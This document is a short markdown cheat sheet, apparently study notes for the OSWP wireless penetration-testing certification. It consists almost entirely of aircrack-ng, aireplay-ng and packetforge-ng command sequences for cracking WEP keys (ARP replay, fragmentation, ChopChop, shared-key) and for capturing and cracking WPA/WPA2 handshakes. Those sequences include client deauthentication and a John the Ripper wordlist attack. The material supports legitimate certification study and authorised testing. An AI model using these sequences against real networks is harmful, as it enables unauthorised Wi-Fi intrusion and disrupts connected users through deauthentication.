# OSWP


### WEP (ARP replay attack - With Client)
```
airmon-ng start wlan0 3
airodump-ng -w wep1 -c 3 --bssid <AP MAC>
aireplay-ng -1 0 -e NETGEAR -a <AP MAC> -h <MACCLIENT> mon0 (Fake authentication)
aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
aireplay-ng -0 1 -a <AP MAC> -c <MACCLIENT> <interface name>
aircrack-ng -z <capture filename>
```

### WEP (Via Client )
```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
    aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface>
    aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
    aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>
aircrack-ng -z <capture>
```

### WEP (Without Client - Fragmentation)
```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -b <AP MAC> -h <Your MAC> <interface>
aireplay-ng -5 -b <AP MAC> -h <Our MAC> <interface>
    packetforge-ng -0 -a <AP MAC> -h <Your MAC> -k <Dest IP> -l <Source IP> -y <xor file> -w <output file>
    packetforge-ng --null -s 42 -a <AP MAC> -h <Source MAC> -w <output filename> -y <PRGA filename>
aireplay-ng -2 -r packet.cap mon0
```

### WEP (Without Client - ChopChop)
```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -b <AP MAC> -h <Your MAC> <interface>
aireplay-ng -4 -b <AP MAC> -h <Source MAC> <interface>
packetforge-ng -0 -a $AP -h $MON -l 192.168.1.113 -k 192.168.1.255 -y replay_dec-1110-163209.xor -w arp.pcap
aireplay-ng -2 -r arp.pcap mon0
```

### WEP (Shared Key)
```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <MACCLIENT> <interface name>
aireplay-ng -1 60 -e NETGEAR -y wepshared-01-00-24-B2-E1-C2-89.xor -a $AP -h 00:c0:ca:98:62:71 wlan0mon
aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
aireplay-ng -0 1 -a <AP MAC> -c <MACCLIENT> <interface name>
aircrack-ng -z <capture filename> 
```
### WPA-WPA2
```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
```

